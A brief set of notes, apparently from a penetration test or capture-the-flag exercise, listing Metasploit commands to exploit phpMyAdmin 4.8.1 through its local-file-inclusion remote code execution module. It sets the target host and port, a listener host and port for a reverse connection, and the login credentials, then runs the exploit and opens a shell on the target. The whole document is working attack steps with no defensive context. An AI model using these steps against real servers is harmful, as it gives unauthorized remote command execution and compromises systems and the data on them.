## phpmyadmin 4.8.1 exploit
use exploit/multi/http/phpmyadmin_lfi_rce
## Port and host setup
set RHOST <target_ip>
set LHOST wg0
set LPORT <valid_port>
set RPORT <target_port> (80 in this case)
set USERNAME <user_name>
set PASSWORD <user_password>
## Accessing system
exploit
shell
